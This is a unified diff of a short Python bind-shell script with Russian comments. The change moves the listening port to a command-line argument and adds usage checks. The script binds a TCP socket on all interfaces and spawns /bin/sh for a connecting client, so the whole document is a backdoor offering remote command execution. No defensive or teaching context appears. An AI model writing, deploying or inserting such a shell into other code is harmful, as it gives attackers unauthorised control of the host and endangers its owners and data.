@@ -1,7 +1,9 @@
 import socket
 import os
+import sys
 
-def bind_shell(host='0.0.0.0', port=4444):
+def bind_shell(port):
+    host = '0.0.0.0'  # Прослушиваем все доступные интерфейсы
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, port))
         s.listen(1)
@@ -17,4 +19,14 @@ def bind_shell(host='0.0.0.0', port=4444):
         # Открываем командную оболочку
         os.system('/bin/sh')
 
-bind_shell()
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <port>")
+        sys.exit(1)
+    
+    try:
+        port = int(sys.argv[1])
+        bind_shell(port)
+    except ValueError:
+        print("Error: Port must be an integer.")
+        sys.exit(1)
